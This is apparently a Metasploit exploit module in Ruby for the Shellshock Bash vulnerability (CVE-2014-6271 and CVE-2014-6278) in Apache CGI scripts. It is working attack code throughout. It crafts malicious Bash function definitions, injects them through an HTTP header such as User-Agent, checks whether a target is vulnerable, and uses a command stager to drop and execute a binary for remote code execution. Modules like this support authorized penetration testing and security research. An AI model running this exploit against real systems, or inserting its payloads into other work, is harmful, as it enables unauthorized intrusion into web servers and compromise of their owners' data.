##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)',
      'Description' => %q{
        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell
        handles external environment variables. This module targets CGI scripts in the
        Apache web server by setting the HTTP_USER_AGENT environment variable to a
        malicious function definition.
      },
      'Author' => [
        'Stephane Chazelas', # Vulnerability discovery
        'wvu', # Original Metasploit aux module
        'juan vazquez', # Allow wvu's module to get native sessions
        'lcamtuf' # CVE-2014-6278
      ],
      'References' => [
        [ 'CVE', '2014-6271' ],
        [ 'CVE', '2014-6278' ],
        [ 'CWE', '94' ],
        [ 'OSVDB', '112004' ],
        [ 'EDB', '34765' ],
        [ 'URL', 'https://access.redhat.com/articles/1200223' ],
        [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ]
      ],
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 2048
        },
      'Targets'        =>
        [
          [ 'Linux x86',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86,
              'CmdStagerFlavor' => [ :echo, :printf ]
            }
          ],
          [ 'Linux x86_64',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X64,
              'CmdStagerFlavor' => [ :echo, :printf ]
            }
          ]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => '2014-09-24',
      'License' => MSF_LICENSE,
      'Notes' =>
          {
            'Stability' => [CRASH_SAFE],
            'SideEffects' => [],
            'Reliability' => [],
            'AKA' => ['Shellshock']
          }
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Path to CGI script']),
      OptString.new('METHOD', [true, 'HTTP method to use', 'GET']),
      OptString.new('HEADER', [true, 'HTTP header to use', 'User-Agent']),
      OptInt.new('CMD_MAX_LENGTH', [true, 'CMD max line length', 2048]),
      OptString.new('RPATH', [true, 'Target PATH for binaries used by the CmdStager', '/bin']),
      OptInt.new('TIMEOUT', [true, 'HTTP read response timeout (seconds)', 5]),
      OptEnum.new('CVE', [true, 'CVE to check/exploit', 'CVE-2014-6271', ['CVE-2014-6271', 'CVE-2014-6278']])
    ])
  end

  def check
    res = req("echo #{marker}", datastore['CVE'])

    if res && res.body.include?(marker * 3)
      return Exploit::CheckCode::Vulnerable
    elsif res && res.code == 500
      injected_res_code = res.code
    else
      return Exploit::CheckCode::Safe
    end

    res = send_request_cgi({
      'method' => datastore['METHOD'],
      'uri' => normalize_uri(target_uri.path.to_s)
    })

    if res && injected_res_code == res.code
      return Exploit::CheckCode::Unknown
    elsif res && injected_res_code != res.code
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Unknown
  end

  def exploit
    execute_cmdstager(:linemax => datastore['CMD_MAX_LENGTH'], :nodelete => true)

    # A last chance after the cmdstager
    # Trying to make it generic
    unless session_created?
      req("#{stager_instance.instance_variable_get("@tempdir")}#{stager_instance.instance_variable_get("@var_elf")}", datastore['CVE'])
    end
  end

  def execute_command(cmd, opts)
    cmd.gsub!('chmod', "#{datastore['RPATH']}/chmod")

    req(cmd, datastore['CVE'])
  end

  def req(cmd, cve)
    case cve
    when 'CVE-2014-6271'
      sploit = cve_2014_6271(cmd)
    when 'CVE-2014-6278'
      sploit = cve_2014_6278(cmd)
    end

    send_request_cgi(
      {
        'method' => datastore['METHOD'],
        'uri' => normalize_uri(target_uri.path.to_s),
        'headers' => {
          datastore['HEADER'] => sploit
        }
      }, datastore['TIMEOUT'])
  end

  def cve_2014_6271(cmd)
    %Q{() { :;};echo -e "\\r\\n#{marker}$(#{cmd})#{marker}"}
  end

  def cve_2014_6278(cmd)
    %Q{() { _; } >_[$($())] { echo -e "\\r\\n#{marker}$(#{cmd})#{marker}"; }}
  end

  def marker
    @marker ||= rand_text_alphanumeric(rand(42) + 1)
  end
end
